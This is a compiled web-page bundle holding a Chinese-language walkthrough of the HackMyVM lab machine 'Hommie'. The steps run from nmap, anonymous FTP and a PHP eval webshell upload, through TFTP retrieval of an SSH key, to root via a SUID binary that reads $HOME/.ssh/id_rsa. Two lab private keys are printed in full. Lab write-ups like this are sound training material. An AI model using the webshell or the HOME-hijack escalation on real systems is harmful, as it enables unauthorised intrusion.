"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[9806],{6002:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>l,contentTitle:()=>a,default:()=>h,frontMatter:()=>r,metadata:()=>d,toc:()=>o});var t=s(85893),i=s(11151);const r={},a="Hommie",d={id:"HackMyVM/Machines/Hommie/index",title:"Hommie",description:"[Linux VM] [Tested on VirtualBox] created by || sml",source:"@site/docs/HackMyVM/Machines/Hommie/index.md",sourceDirName:"HackMyVM/Machines/Hommie",slug:"/HackMyVM/Machines/Hommie/",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Hommie/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/Hommie/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackMyVM_Sidebar",previous:{title:"Helium",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Helium/"},next:{title:"Insomnia",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Insomnia/"}},l={},o=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"\u8bbf\u95ee web \u670d\u52a1",id:"\u8bbf\u95ee-web-\u670d\u52a1",level:2},{value:"\u5229\u7528 ftp \u670d\u52a1\u533f\u540d\u767b\u9646",id:"\u5229\u7528-ftp-\u670d\u52a1\u533f\u540d\u767b\u9646",level:2},{value:"\u5229\u7528 tftp \u670d\u52a1\u4e0b\u8f7d <code>id_rsa</code> \u5e76\u52a0\u4ee5\u5229\u7528",id:"\u5229\u7528-tftp-\u670d\u52a1\u4e0b\u8f7d-id_rsa-\u5e76\u52a0\u4ee5\u5229\u7528",level:2},{value:"user pwned",id:"user-pwned",level:2},{value:"\u5c1d\u8bd5\u63d0\u6743",id:"\u5c1d\u8bd5\u63d0\u6743",level:2},{value:"\u5229\u7528 <code>/opt/showMetheKey</code>",id:"\u5229\u7528-optshowmethekey",level:2},{value:"\u5bfb\u627e <code>root.txt</code>",id:"\u5bfb\u627e-roottxt",level:2},{value:"root pwned",id:"root-pwned",level:2}];function c(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",img:"img",p:"p",pre:"pre",...(0,i.a)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h1,{id:"hommie",children:"Hommie"}),"\n",(0,t.jsxs)(n.admonition,{type:"note",children:[(0,t.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || sml"}),(0,t.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2020-09-30"}),(0,t.jsx)(n.p,{children:"\u2714\ufe0f MD5 // 5c6915e238e3e0647e1d508522907c74"}),(0,t.jsx)(n.p,{children:"\u2620 Root // 225"}),(0,t.jsx)(n.p,{children:"\ud83d\udc80 User // 230"}),(0,t.jsx)(n.p,{children:"\ud83d\udcddNotes //\nEnumeration is the KEY. Tested on VirtualBox."})]}),"\n",(0,t.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"\u9776\u673a\u542f\u52a8",src:s(6316).Z+"",width:"1020",height:"687"})}),"\n",(0,t.jsx)(n.p,{children:"\u9776\u673a IP\uff1a"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.105\n"})}),"\n",(0,t.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"Nmap scan report for 192.168.56.105\nHost is up (0.00031s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_-rw-r--r--    1 0        0               0 Sep 30  2020 index.html\n| ftp-syst:\n|   STAT:\n| FTP server status:\n|      Connected to ::ffff:192.168.56.102\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 2\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey:\n|   2048 c627ab53abb9c020373652a960d353fc (RSA)\n|   256 483b281f9a23da71f6050ba5a6c8b7b0 (ECDSA)\n|_  256 b32e7cff622d53dd6397d44772c84e30 (ED25519)\n80/tcp open  http    nginx 1.14.2\n|_http-title: Site doesn't have a title (text/html).\n|_http-server-header: nginx/1.14.2\nMAC Address: 08:00:27:B6:0D:21 (Oracle VirtualBox virtual NIC)\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.6\nNetwork Distance: 1 hop\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u53ef\u4ee5\u53d1\u73b0 ftp \u670d\u52a1\u5141\u8bb8\u533f\u540d\u8bbf\u95ee\uff0c\u808c\u8089\u53cd\u5e94\u53ef\u80fd\u5b58\u5728 ftp \u63a7\u5236 web \u670d\u52a1\u7684\u76ee\u5f55\uff0c\u8fdb\u800c\u5b9e\u73b0\u5199\u5165 webshell \u5f97\u6743"}),"\n",(0,t.jsx)(n.h2,{id:"\u8bbf\u95ee-web-\u670d\u52a1",children:"\u8bbf\u95ee web \u670d\u52a1"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:'\u250c\u2500[randark@randark-Parrot]\u2500[~/tmp/HackMyVM-Hommie]\n\u2514\u2500\u2500\u257c $http get 192.168.56.105\nHTTP/1.1 200 OK\nConnection: keep-alive\nContent-Encoding: gzip\nContent-Type: text/html\nDate: Fri, 22 Dec 2023 15:03:52 GMT\nETag: W/"5f749979-63"\nLast-Modified: Wed, 30 Sep 2020 14:43:05 GMT\nServer: nginx/1.14.2\nTransfer-Encoding: chunked\n\nalexia, Your id_rsa is exposed, please move it!!!!!\nIm fighting regarding reverse shells!\n-nobody\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u51fa\u73b0\u4e24\u4f4d\u4eba\u7269:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"alexia\nnobody\n"})}),"\n",(0,t.jsx)(n.h2,{id:"\u5229\u7528-ftp-\u670d\u52a1\u533f\u540d\u767b\u9646",children:"\u5229\u7528 ftp \u670d\u52a1\u533f\u540d\u767b\u9646"}),"\n",(0,t.jsx)(n.p,{children:"ftp \u670d\u52a1\u5141\u8bb8\u533f\u540d\u8bbf\u95ee"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@randark-Parrot]\u2500[~/tmp/HackMyVM-Hommie]\n\u2514\u2500\u2500\u257c $ftp 192.168.56.105\nConnected to 192.168.56.105.\n220 (vsFTPd 3.0.3)\nName (192.168.56.105:randark): Anonymous\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp>\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5217\u51fa\u6240\u6709\u76ee\u5f55\u548c\u6587\u4ef6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"ftp> ls -lah\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxr-xr-x    3 0        113          4096 Sep 30  2020 .\ndrwxr-xr-x    3 0        113          4096 Sep 30  2020 ..\ndrwxrwxr-x    2 0        113          4096 Sep 30  2020 .web\n-rw-r--r--    1 0        0               0 Sep 30  2020 index.html\n226 Directory send OK.\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u67e5\u770b ",(0,t.jsx)(n.code,{children:".web"})," \u76ee\u5f55"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"ftp> cd .web\n250 Directory successfully changed.\nftp> ls -lah\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxrwxr-x    2 0        113          4096 Sep 30  2020 .\ndrwxr-xr-x    3 0        113          4096 Sep 30  2020 ..\n-rw-r--r--    1 0        0              99 Sep 30  2020 index.html\n226 Directory send OK.\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5e76\u4e14\u53ef\u4ee5\u4e0a\u4f20 webshell"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"ftp> put webshell.php\nlocal: webshell.php remote: webshell.php\n200 PORT command successful. Consider using PASV.\n150 Ok to send data.\n226 Transfer complete.\n32 bytes sent in 0.00 secs (459.5588 kB/s)\nftp> ls -lah\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxrwxr-x    2 0        113          4096 Dec 22 10:17 .\ndrwxr-xr-x    3 0        113          4096 Sep 30  2020 ..\n-rw-r--r--    1 0        0              99 Sep 30  2020 index.html\n-rw-r--r--    1 106      113            32 Dec 22 10:17 webshell.php\n226 Directory send OK.\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5c1d\u8bd5\u8bbf\u95ee webshell"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@randark-Parrot]\u2500[~/tmp/HackMyVM-Hommie]\n\u2514\u2500\u2500\u257c $http get 192.168.56.105/webshell.php\nHTTP/1.1 200 OK\nAccept-Ranges: bytes\nConnection: keep-alive\nContent-Length: 32\nContent-Type: application/octet-stream\nDate: Fri, 22 Dec 2023 15:18:06 GMT\nETag: \"6585a881-20\"\nLast-Modified: Fri, 22 Dec 2023 15:17:21 GMT\nServer: nginx/1.14.2\n\n<?php @eval($_POST['shell']) ?>\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u6587\u4ef6\u53ef\u4ee5\u6b63\u5e38\u8fd4\u56de\uff0c\u4f46\u662f\u670d\u52a1\u7aef\u5e76\u4e0d\u4f1a\u89e3\u6790 php \u6587\u4ef6"}),"\n",(0,t.jsxs)(n.h2,{id:"\u5229\u7528-tftp-\u670d\u52a1\u4e0b\u8f7d-id_rsa-\u5e76\u52a0\u4ee5\u5229\u7528",children:["\u5229\u7528 tftp \u670d\u52a1\u4e0b\u8f7d ",(0,t.jsx)(n.code,{children:"id_rsa"})," \u5e76\u52a0\u4ee5\u5229\u7528"]}),"\n",(0,t.jsxs)(n.p,{children:["\u4e0b\u8f7d ",(0,t.jsx)(n.code,{children:"id_rsa"})," \u6587\u4ef6"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"\u250c\u2500[randark@randark-Parrot]\u2500[~/tmp/HackMyVM-Hommie]\n\u2514\u2500\u2500\u257c $tftp 192.168.56.105\ntftp> get id_rsa\nReceived 1850 bytes in 0.0 seconds\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5229\u7528\u79c1\u94a5\u767b\u5f55 SSH"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@randark-Parrot]\u2500[~/tmp/HackMyVM-Hommie]\n\u2514\u2500\u2500\u257c $ssh alexia@192.168.56.105 -i id_rsa\nLinux hommie 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Fri Dec 22 10:59:52 2023 from 192.168.56.102\nalexia@hommie:~$ whoami\nalexia\n"})}),"\n",(0,t.jsx)(n.h2,{id:"user-pwned",children:"user pwned"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"alexia@hommie:~$ cat user.txt\nImnotroot\n"})}),"\n",(0,t.jsx)(n.h2,{id:"\u5c1d\u8bd5\u63d0\u6743",children:"\u5c1d\u8bd5\u63d0\u6743"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="find / -perm -u=s -type f 2>/dev/null"',children:"/opt/showMetheKey\n/usr/lib/openssh/ssh-keysign\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/bin/gpasswd\n/usr/bin/chfn\n/usr/bin/su\n/usr/bin/mount\n/usr/bin/chsh\n/usr/bin/passwd\n/usr/bin/newgrp\n/usr/bin/umount\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u53d1\u73b0\u53ef\u7591\u4e8c\u8fdb\u5236\u6587\u4ef6\uff1a",(0,t.jsx)(n.code,{children:"/opt/showMetheKey"})]}),"\n",(0,t.jsxs)(n.h2,{id:"\u5229\u7528-optshowmethekey",children:["\u5229\u7528 ",(0,t.jsx)(n.code,{children:"/opt/showMetheKey"})]}),"\n",(0,t.jsx)(n.p,{children:"\u5c1d\u8bd5\u76f4\u63a5\u8fd0\u884c"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"alexia@hommie:~$ /opt/showMetheKey\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEApwUR2Pvdhsu1RGG0UIWmj2yDNvs+4VLPG0WWisip6oZrjMjJ40h7\nV0zdgZSRFhMxx0/E6ilh2MiMbpAuogCqC3MEodzIzHYAJyK4z/lIqUNdHJbgLDyaY26G0y\nRn1XI+RqLi5NUHBPyiWEuQUEZCMOqi5lS1kaiNHmVqx+rlEs6ZUq7Z6lzYs7da3XcFGuOT\ngCnBh1Wb4m4e14yF+Syn4wQVh1u/53XGmeB/ClcdAbSKoJswjI1JqCCkxudwRMUYjq309j\nQMxa7bbxaJbkb3hLmMuFU7RGEPu7spLvzRwGAzCuU3f60qJVTp65pzFf3x51j3YAMI+ZBq\nkyNE1y12swAAA8i6ZpNpumaTaQAAAAdzc2gtcnNhAAABAQCnBRHY+92Gy7VEYbRQhaaPbI\nM2+z7hUs8bRZaKyKnqhmuMyMnjSHtXTN2BlJEWEzHHT8TqKWHYyIxukC6iAKoLcwSh3MjM\ndgAnIrjP+UipQ10cluAsPJpjbobTJGfVcj5GouLk1QcE/KJYS5BQRkIw6qLmVLWRqI0eZW\nrH6uUSzplSrtnqXNizt1rddwUa45OAKcGHVZvibh7XjIX5LKfjBBWHW7/ndcaZ4H8KVx0B\ntIqgmzCMjUmoIKTG53BExRiOrfT2NAzFrttvFoluRveEuYy4VTtEYQ+7uyku/NHAYDMK5T\nd/rSolVOnrmnMV/fHnWPdgAwj5kGqTI0TXLXazAAAAAwEAAQAAAQBhD7sthEFbAqtXEAi/\n+suu8frXSu9h9sPRL4GrKa5FUtTRviZFZWv4cf0QPwyJ7aGyGJNxGZd5aiLiZfwTvZsUiE\nUa47n1yGWSWMVaZ55ob3N/F9czHg0C18qWjcOh8YBrgGGnZn1r0n1uHovBevMghlsgy/2w\npmlMTtfdUo7JfEKbZmsz3auih2/64rmVp3r0YyGrvOpWuV7spnzPNAFUCjPTwgE2RpBVtk\nWeiQtF8IedoMqitUsJU9ephyYqvjRemEugkqkALBJt91yBBO6ilulD8Xv1RBsVHUttE/Jz\nbu4XlJXVeD10ooFofrsZd/9Ydz4fx49GwtjYnqsda0rBAAAAgGbx1tdwaTPYdEfuK1kBhu\n3ln3QHVx3ZkZ7tNQFxxEjYjIPUQcFFoNBQpIUNOhLCphB8agrhcke5+aq5z2nMdXUJ3DO6\n0boB4mWSMml6aGpW4AfcDFTybT6V8pwZcThS9FL3K2JmlZbgPlhkX5fyOmh14/i5ti7r9z\nHlBkwMfJJPAAAAgQDPt0ouxdkG1kDNhGbGuHSMAsPibivXEB7/wK7XHTwtQZ7cCQTVqbbs\ny6FqG0oSaSz4m2DfWSRZc30351lU4ZEoHJmlL8Ul6yvCjMOnzUzkhrIen131h/MStsQYtY\nOZgwwdcG2+N7MReMpbDA9FSHLtHoMLUcxShLSX3ccIoWxqAwAAAIEAzdgK1iwvZkOOtM08\nQPaLXRINjIKwVdmOk3Q7vFhFRoman0JeyUbEd0qlcXjFzo02MBlBadh+XlsDUqZSWo7gpp\nivFRbnEu2sy02CHilIJ6vXCQnuaflapCNG8MlG5CtpqfyVoYQ3N3d0PfOWLaB13fGeV/wN\n0x2HyroKtB+OeZEAAAANYWxleGlhQGhvbW1pZQECAwQFBg==\n-----END OPENSSH PRIVATE KEY-----\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5c06\u6587\u4ef6\u4e0b\u8f7d\u5230\u672c\u5730\u8fdb\u884c\u9006\u5411\u5206\u6790"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"/opt/showMetheKey \u9006\u5411\u5206\u6790",src:s(19539).Z+"",width:"1407",height:"854"})}),"\n",(0,t.jsx)(n.p,{children:"\u53ef\u4ee5\u53d1\u73b0\u6838\u5fc3\u5728\u4e8e\u8fd9\u53e5"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-c",children:'system("cat $HOME/.ssh/id_rsa");\n'})}),"\n",(0,t.jsxs)(n.p,{children:["\u90a3\u4e48\u5c31\u53ef\u4ee5\u901a\u8fc7\u63a7\u5236 ",(0,t.jsx)(n.code,{children:"$HOME"})," \u73af\u5883\u53d8\u91cf\uff0c\u6765\u8ba9 ",(0,t.jsx)(n.code,{children:"/opt/showMetheKey"})," \u8bfb\u53d6 root \u8d26\u6237\u7684 SSH \u79c1\u94a5"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"alexia@hommie:/home/alexia$ export HOME=/root\nalexia@hommie:/home/alexia$ /opt/showMetheKey\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAvBYog1I3rTTmtMw6i7oPRYy7yj8N6zNT3K9QhalnaTF+Md5NjbX5\nhhNfZjO0tNbMGEeJtNTc3FpYWcAujrrd3jO5MzHUWAxQoyYYrZOFj2I5Fz/0RxD7e89H11\n5nT7+CSUeddP/UeoyvSPgaruwrwD+dUl7+GiXo3sc5vsq3YufTYh1MlMKb/m7KmVk5n4Tk\n/IFJwuuc3U4OZiRwXOmK4W2Gfo0Fonu6vFYmhpcCsi7V8g3hpVmOZIU8ZUtG1YbutCVbOC\nEGyc1p5nbnyC0IIF5Y2EhjeevX8gmj4Kdv/y6yuvNdsJKm+ed2EEY9AymmPPwIpQshFwKz\nY0yB8N1jkQAAA8BiCyR9YgskfQAAAAdzc2gtcnNhAAABAQC8FiiDUjetNOa0zDqLug9FjL\nvKPw3rM1Pcr1CFqWdpMX4x3k2NtfmGE19mM7S01swYR4m01NzcWlhZwC6Out3eM7kzMdRY\nDFCjJhitk4WPYjkXP/RHEPt7z0fXXmdPv4JJR510/9R6jK9I+Bqu7CvAP51SXv4aJejexz\nm+yrdi59NiHUyUwpv+bsqZWTmfhOT8gUnC65zdTg5mJHBc6YrhbYZ+jQWie7q8ViaGlwKy\nLtXyDeGlWY5khTxlS0bVhu60JVs4IQbJzWnmdufILQggXljYSGN569fyCaPgp2//LrK681\n2wkqb553YQRj0DKaY8/AilCyEXArNjTIHw3WORAAAAAwEAAQAAAQA/OvPDshAlmnM0tLO5\n5YLczsMS6r+zIj4/InDffmPVaV4TRbisu1B3Umvv39IQOWXDg8k3kZfuPDEXexQrx4Zu/N\nR18XqBXyJ8toH1WHK+ETdAKa/ldEAXD0gHjyUMGkWifQDiJF86E7GZxk6yH5NVvg0Vc/nY\nsIXo3vD6wwuDo/gj+u4RRYMH3NYkLSj/O67cxGXnTOZPGzGsFTrE218BNtNqbRBR9/immU\nirjugqebxY135Z4oECe/Hv4mP2e7n5QVO8FnYklQ4YU6y0ZTAMtjZCAhslXSKvaJPLjXuk\n/HpdYhSoojm3vTAq/NT/oir0wA2ZYGdnF/Bxm6v/mntBAAAAgF2pqZEe9UqzcsAfOujr6z\nDMRgPpl8qsdhDz6aftdg24AYmgXJ1D7PWUDpU6puO3VxJGrOwvcgD6xELRTxeFjd/2ssrh\n4OO/kTvK4K0WVB/bnZ4y724iLcThfHDbzTTc5ckn45tyso8540iKha5ay1i24GwRPWddie\nB/qcB1bHNOAAAAgQDmmptuwTRwUSiU1NtZRnJFvxvzLw6Wy/Cb2G+n5KY0ce5cYHT2HSIr\nzsbPaDXQNBFy4iu1DAXAJJXTrxjOaAeLVYSb/8eZ1dhcgkxoAC8i2l6NwNmsjhGQKv++fV\nqMfIdzVmriLXBZf7DU97YZeDIOrdOOV5CHhq+37i4xNdK18wAAAIEA0Mzc8HYvrXk4ecyi\nKXP5u2Zxw2LADJ8DFeKWZmCUuNKFD1TuqdauxKxIVKVDaHvcnEr1bOiEBBso/X1CCtKjE+\n12ZOWvqZ4fORxiNs9n/9YxlUSDAw7kyKd9H7dRRFdtb80OgDiwf18tDlEdboGWm/DR0NPq\ngmxzbd40GES6DWsAAAALcm9vdEBob21taWU=\n-----END OPENSSH PRIVATE KEY-----\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u4fdd\u5b58 SSH \u79c1\u94a5\u5230\u672c\u5730\uff0c\u7136\u540e\u5c1d\u8bd5\u767b\u5f55 root \u8d26\u6237"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@randark-Parrot]\u2500[~/tmp/HackMyVM-Hommie]\n\u2514\u2500\u2500\u257c $ssh root@192.168.56.105 -i id_rsa_root\nLinux hommie 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Wed Sep 30 11:03:23 2020\nroot@hommie:~# whoami\nroot\n"})}),"\n",(0,t.jsxs)(n.h2,{id:"\u5bfb\u627e-roottxt",children:["\u5bfb\u627e ",(0,t.jsx)(n.code,{children:"root.txt"})]}),"\n",(0,t.jsxs)(n.p,{children:["\u5728 root \u7684\u7528\u6237\u76ee\u5f55\u4e0b\uff0c\u53ea\u53d1\u73b0\u4e86\u4e00\u4e2a ",(0,t.jsx)(n.code,{children:"note.txt"})," \u6587\u4ef6"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="/root/note.txt"',children:"I dont remember where I stored root.txt !!!\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5c1d\u8bd5\u5168\u76d8\u641c\u7d22\u6587\u4ef6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:'root@hommie:/# find / -name "root.txt" 2>/dev/null\n/usr/include/root.txt\n'})}),"\n",(0,t.jsx)(n.h2,{id:"root-pwned",children:"root pwned"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"root@hommie:/# cat /usr/include/root.txt\nImnotbatman\n"})})]})}function h(e={}){const{wrapper:n}={...(0,i.a)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(c,{...e})}):c(e)}},19539:(e,n,s)=>{s.d(n,{Z:()=>t});const t=s.p+"assets/images/image_20231205-000505-ee462529d3d233a6177d38cab76de7df.png"},6316:(e,n,s)=>{s.d(n,{Z:()=>t});const t=s.p+"assets/images/image_20231256-225647-e52e5c9f73e61b2fbd898d8fb4325a5b.png"},11151:(e,n,s)=>{s.d(n,{Z:()=>d,a:()=>a});var t=s(67294);const i={},r=t.createContext(i);function a(e){const n=t.useContext(r);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function d(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:a(e.components),t.createElement(r.Provider,{value:n},e.children)}}}]);